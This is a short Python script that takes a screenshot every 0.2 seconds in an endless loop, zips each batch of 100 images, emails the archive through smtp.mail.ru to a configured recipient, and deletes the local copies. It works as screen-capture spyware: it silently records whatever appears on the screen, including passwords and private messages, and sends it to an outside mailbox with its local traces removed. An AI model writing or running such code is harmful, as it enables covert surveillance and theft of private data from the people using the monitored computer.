import time
import os
import shutil
from email.message import EmailMessage
import smtplib
import pyautogui
import zipfile

# Email configuration
SMTP_SERVER = 'smtp.mail.ru'
SMTP_PORT = 587
EMAIL_ADDRESS = ''  # Replace with your email address
EMAIL_PASSWORD = ''  # Replace with your email password
EMAIL_RECIPIENT = ''  # Replace with the email address you want to send the screenshots to

# Global variables
screenshots_folder = "D:\\camerashot\\"
screenshot_counter = 1
screenshots_per_folder = 100
folders_per_archive = 5


def take_screenshot():
    global screenshot_counter
    folder_counter = 1
    while True:
        folder_name = f"screenshots_{folder_counter}"
        folder_path = os.path.join(screenshots_folder, folder_name)
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
        screenshot = pyautogui.screenshot()
        screenshot_filename = f"screenshot_{screenshot_counter}.png"
        screenshot_path = os.path.join(folder_path, screenshot_filename)
        screenshot.save(screenshot_path)
        screenshot_counter += 1
        if screenshot_counter % screenshots_per_folder == 0:
            if folder_counter > 0:
                archive_and_send(folder_name)
            folder_counter += 1
            if folder_counter <= 0:
                folder_counter = 1
        time.sleep(0.2)


def archive_and_send(folder_name):
    folder_path = os.path.join(screenshots_folder, folder_name)
    if len(os.listdir(folder_path)) == 0:
        return
    archive_name = f"{folder_name}.zip"
    archive_path = os.path.join(screenshots_folder, archive_name)
    with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in os.listdir(folder_path):
            if file.endswith(".png"):
                file_path = os.path.join(folder_path, file)
                zipf.write(file_path, arcname=os.path.join(folder_name, file))
        shutil.rmtree(folder_path)
    msg = EmailMessage( )
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_RECIPIENT
    msg['Subject'] = 'Screenshots'
    with open(archive_path, 'rb') as f:
        archive_data = f.read( )
    msg.add_attachment(archive_data, maintype='application', subtype='zip', filename=archive_name)
    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
        smtp.starttls( )
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)
    os.remove(archive_path)
    time.sleep(10)


if not os.path.exists(screenshots_folder):
    os.makedirs(screenshots_folder)

take_screenshot( )
